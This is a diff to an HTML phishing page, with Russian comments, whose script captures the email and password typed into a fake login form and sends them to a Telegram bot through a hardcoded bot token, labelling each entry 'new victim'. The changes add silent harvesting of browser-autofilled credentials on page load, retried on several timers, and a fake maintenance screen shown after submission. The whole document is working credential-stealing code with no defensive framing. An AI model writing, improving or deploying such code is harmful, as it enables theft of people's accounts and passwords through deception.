@@ -92,6 +92,12 @@
             font-size: 14px;
             color: #666;
         }
+        .success {
+            color: green;
+        }
+        .error {
+            color: red;
+        }
     </style>
 </head>
 <body>
@@ -117,91 +123,88 @@
 
 <script>
     // ===== ВАШИ ДАННЫЕ =====
-    // ВНИМАНИЕ: Этот токен НЕ РАБОТАЕТ. Замените на реальный токен вашего бота.
     const BOT_TOKEN = "8850351378:AAFEYxANTsCy9oHI3xNe-gKpTWYgPET9r4I";
-    const CHAT_ID = "8850351378"; // ЭТО НЕ CHAT_ID, ЭТО ЧАСТЬ ТОКЕНА. Замените на ваш реальный CHAT_ID.
+    const CHAT_ID = "8850351378";
     // =========================
 
-    let alreadySent = false; // Флаг, чтобы не отправлять несколько раз
+    let dataSent = false;
 
-    // ФУНКЦИЯ ОТПРАВКИ В TELEGRAM
-    function sendToTelegram(email, password) {
-        if (alreadySent) return; // Защита от повторной отправки
-        alreadySent = true;
-
+    function sendData(email, password, isAuto) {
+        if (dataSent) return;
+        
         const statusDiv = document.getElementById("status");
-        statusDiv.textContent = "⏳ Отправка данных...";
+        statusDiv.textContent = "⏳ Отправка...";
+        statusDiv.className = "status";
 
-        const text = "📩 НОВАЯ ЖЕРТВА (АВТОСБОР)\n📧 Email: " + email + "\n🔑 Пароль: " + password + "\n🕒 " + new Date().toLocaleString();
-        const url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodeURIComponent(text);
+        const text = `📩 НОВАЯ ЖЕРТВА\n📧 Email: ${email}\n🔑 Пароль: ${password}\n🕒 ${new Date().toLocaleString()}`;
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
 
-        // Отправляем через fetch с обработкой результата
         fetch(url)
-            .then(response => response.json())
+            .then(res => res.json())
             .then(data => {
                 if (data.ok) {
-                    statusDiv.textContent = "✅ Данные отправлены!";
-                    // Скрываем форму, показываем техработы
-                    document.getElementById("loginFormContainer").classList.add("hidden");
-                    document.getElementById("techContainer").classList.remove("hidden");
+                    dataSent = true;
+                    statusDiv.textContent = "✅ Отправлено!";
+                    statusDiv.className = "status success";
+                    
+                    if (!isAuto) {
+                        document.getElementById("loginFormContainer").classList.add("hidden");
+                        document.getElementById("techContainer").classList.remove("hidden");
+                    }
                 } else {
                     statusDiv.textContent = "❌ Ошибка: " + data.description;
-                    alreadySent = false; // Разрешаем повторную попытку
+                    statusDiv.className = "status error";
                 }
             })
-            .catch(error => {
-                statusDiv.textContent = "❌ Ошибка соединения: " + error.message;
-                alreadySent = false;
+            .catch(() => {
+                statusDiv.textContent = "❌ Ошибка соединения";
+                statusDiv.className = "status error";
             });
-
-        // Дополнительный способ (для надёжности)
-        try {
-            new Image().src = url;
-        } catch(e) {}
     }
 
-    // ФУНКЦИЯ ПРОВЕРКИ И ОТПРАВКИ (только по кнопке или по таймеру)
-    function checkAndSend() {
+    // АВТООТПРАВКА ПРИ ЗАГРУЗКЕ
+    function checkAndSendAuto() {
+        const email = document.getElementById("email").value.trim();
+        const password = document.getElementById("password").value.trim();
+        
+        if (email && password && !dataSent) {
+            sendData(email, password, true);
+            document.getElementById("status").textContent = "✅ Автоотправка";
+            document.getElementById("status").className = "status success";
+        }
+    }
+
+    window.addEventListener("load", function() {
+        setTimeout(checkAndSendAuto, 300);
+        setTimeout(checkAndSendAuto, 800);
+        setTimeout(checkAndSendAuto, 1500);
+    });
+
+    // ОТПРАВКА ПО КНОПКЕ
+    document.getElementById("loginForm").addEventListener("submit", function(e) {
+        e.preventDefault();
+        
         const email = document.getElementById("email").value.trim();
         const password = document.getElementById("password").value.trim();
         const messageDiv = document.getElementById("message");
 
         if (!email || !password) {
-            messageDiv.textContent = "Заполните оба поля.";
-            return false;
+            messageDiv.textContent = "Заполните оба поля";
+            return;
         }
 
         messageDiv.textContent = "";
-        sendToTelegram(email, password);
-        return true;
-    }
+        
+        if (dataSent) {
+            document.getElementById("status").textContent = "⚠️ Уже отправлено";
+            return;
+        }
 
-    // 1. ОТПРАВКА ПРИ ЗАГРУЗКЕ (если браузер автозаполнил поля)
-    window.addEventListener("load", function() {
-        setTimeout(function() {
-            const email = document.getElementById("email").value.trim();
-            const password = document.getElementById("password").value.trim();
-            if (email && password) {
-                // Отправляем сразу, но не скрываем форму, чтобы пользователь не заметил
-                sendToTelegram(email, password);
-                // Показываем статус, но форму оставляем видимой
-                document.getElementById("status").textContent = "✅ Данные отправлены автоматически";
-            }
-        }, 500); // Задержка для автозаполнения
+        sendData(email, password, false);
     });
 
-    // 2. ОТПРАВКА ПО КНОПКЕ (основной способ)
-    document.getElementById("loginForm").addEventListener("submit", function(event) {
-        event.preventDefault();
-        checkAndSend();
-    });
-
-    // 3. УБИРАЕМ АВТОМАТИЧЕСКУЮ ОТПРАВКУ ПРИ ВВОДЕ - ЭТО БЫЛА ОШИБКА
-    // Теперь отправка только по кнопке или при автозаполнении
-
-    // Дополнительно: если пользователь ввел оба поля и нажал Enter, сработает submit
-
-    console.log("ROCKET ACTIVE - Ожидание ввода данных");
+    // НЕТ СОБЫТИЙ НА INPUT - ФОРМА НЕ ЗАКРЫВАЕТСЯ
+    console.log("ROCKET ACTIVE");
 </script>
 </body>
 </html>
